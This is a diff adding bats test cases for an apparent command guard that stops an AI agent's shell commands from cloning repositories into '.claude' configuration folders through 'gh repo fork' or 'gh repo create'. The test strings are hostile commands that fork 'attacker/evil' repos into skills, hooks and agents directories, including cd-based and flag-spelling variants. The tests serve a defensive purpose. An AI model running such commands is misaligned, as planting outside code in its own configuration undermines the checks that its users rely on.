@@ -478,6 +478,63 @@ assert_each_config_write() {
     assert_each 0 '' "git -C . clone https://github.com/x/y.git" "git -C . clone git@github.com:x/y"
 }
 
+@test "gh repo fork and create cloning through --clone or create's -c are checked, words after -- and default directory included" {
+    assert_each_config_write \
+        "gh repo fork attacker/evil --clone -- .claude/skills/evil" \
+        "gh repo fork attacker/.claude --clone" \
+        "gh repo fork https://github.com/attacker/.claude.git --clone" \
+        "gh repo fork attacker/evil --clone --fork-name .claude" \
+        "gh repo fork attacker/evil --clone --fork-name=.claude" \
+        "gh repo fork attacker/.claude --clone=true" \
+        "gh repo fork attacker/.claude --clone=1" \
+        "gh repo create .claude --clone" \
+        "gh repo create attacker/.claude --public -c" \
+        "gh repo create .claude -c=true" \
+        "gh repo create .claude -cdtext" \
+        "gh repo new .claude --clone" \
+        "gh repo create .claude --template attacker/evil --clone"
+    assert_each 2 'outside the allowed directories' \
+        "gh repo fork attacker/evil --clone -- ../outside/evil" \
+        "gh repo fork attacker/evil --clone -- ${TEST_TMP}/outside/evil"
+}
+
+@test "gh repo fork and create cloning into a .claude working directory are blocked" {
+    mkdir -p "${TEST_TMP}/repo/.claude"
+    assert_each 2 'through a cd into it' \
+        "cd .claude && gh repo fork attacker/agents --clone --fork-name agents" \
+        "cd .claude && gh repo create hooks --clone" \
+        "cd .claude && gh repo create hooks --clone=true" \
+        "cd .claude && gh repo create x -c"
+    assert_each_config_write_in_dir "${TEST_TMP}/repo/.claude" \
+        "gh repo fork attacker/agents --clone --fork-name agents" \
+        "gh repo create hooks --clone" \
+        "gh repo create x -c"
+}
+
+@test "a non-literal word in gh repo fork or create, or a non-literal subcommand with -c, fails closed" {
+    assert_each 2 'non-literal argument' \
+        "gh repo fork attacker/evil \"\$X\"" \
+        "gh repo create \"\$NAME\" --private" \
+        "gh \"\$G\" \"\$S\" x -c"
+}
+
+@test "gh repo fork and create that do not clone, and -c of other gh subcommands, are allowed" {
+    mkdir -p "${TEST_TMP}/repo/.claude"
+    assert_each 0 '' \
+        "gh repo fork o/r --clone" \
+        "gh repo fork o/r --clone=false" \
+        "gh repo fork o/r --clone=0" \
+        "gh repo fork o/r" \
+        "gh repo create x --public" \
+        "gh repo create x --public --clone" \
+        "gh repo create x -c=false" \
+        "gh repo fork o/r -- --depth 1" \
+        "cd .claude && gh repo fork o/r --clone=false" \
+        "cd .claude && gh repo create x --private" \
+        "cd .claude && gh pr review 1 -c -b 'see .claude/settings.json'" \
+        "gh pr review 1 -c -b 'see .claude/settings.json'"
+}
+
 @test "a write target held in a variable is blocked, protected suffix or not" {
     assert_each 2 'could not be verified' \
         "echo x >> \"\$HOME/.claude/settings.local.json\"" \
